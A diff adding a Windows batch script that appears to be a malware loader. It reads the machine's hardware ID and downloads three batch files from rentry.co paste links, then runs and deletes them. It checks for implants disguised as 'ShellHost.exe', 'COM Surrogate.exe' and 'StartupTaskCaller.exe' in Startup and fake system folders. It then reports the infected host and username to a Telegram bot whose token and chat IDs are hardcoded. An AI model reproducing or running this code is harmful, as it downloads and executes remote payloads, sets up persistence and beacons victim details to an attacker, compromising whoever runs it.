@@ -1,0 +1,150 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Place HWID into %HWID% variable ( SVb5DCPV )
+for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i
+
+:: Fucker CHAT ID : -1002163721260
+:: Output CHAT ID : -1002460905948
+
+
+:: Set bot token, chat ID, and message
+set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID=-1002163721260"
+set "MESSAGE=AgentConnected|%HWID%|"
+
+
+
+
+:loop
+color 0A
+
+
+
+
+
+:CheckSHST
+:: Check ShellHost.exe; if found, skip to SENDMSG
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe" (
+    goto CheckComSurrogate
+)
+
+:: Run commands if ShellHost.exe is not found
+echo Checking for ShellHost...
+set "embeddedScript=temp_script_SHST.bat"
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/vogq6xig/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from ShellHost Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckSHST
+)
+
+set "MESSAGE=%MESSAGE%|SHST|"
+
+
+
+
+
+
+
+
+
+
+
+
+echo.
+echo.
+:CheckComSurrogate
+:: Check ComSurrogate.exe; if found, skip to next section
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe" (
+    goto CheckSTC
+)
+
+:: Run commands if ComSurrogate.exe is not found
+echo Checking for COM Surrogate...
+set "embeddedScript=temp_script_COM.bat"
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/kbg9xro5/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from ComSurrogate Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckComSurrogate
+)
+
+set "MESSAGE=%MESSAGE%|ComSurrogate|"
+
+
+
+
+
+
+
+
+
+
+echo.
+echo.
+:CheckSTC
+:: Check StartupTaskCaller.exe; if found, skip to SENDMSG
+if exist "%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe" (
+    goto SENDMSG
+)
+
+:: Run commands if StartupTaskCaller.exe is not found
+echo Checking for StartupTaskCaller...
+set "embeddedScript=temp_script_STC.bat"
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/m24vvavb/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from StartupTaskCaller Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckSTC
+)
+
+set "MESSAGE=%MESSAGE%|STC|"
+
+
+
+
+timeout /t 5 /nobreak >nul
+
+:SENDMSG
+
+
+if not exist "%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe" (
+    set "MESSAGE=%MESSAGE%|NOTEXISTSTC|"
+)
+
+
+:: URL encode the message by replacing spaces with %20
+set "ENCODED_MESSAGE=%MESSAGE: =%%2%USERNAME%"
+
+:: Send the message using curl
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=%ENCODED_MESSAGE%"
+
+echo Message sent to chat ID %CHAT_ID%
+endlocal
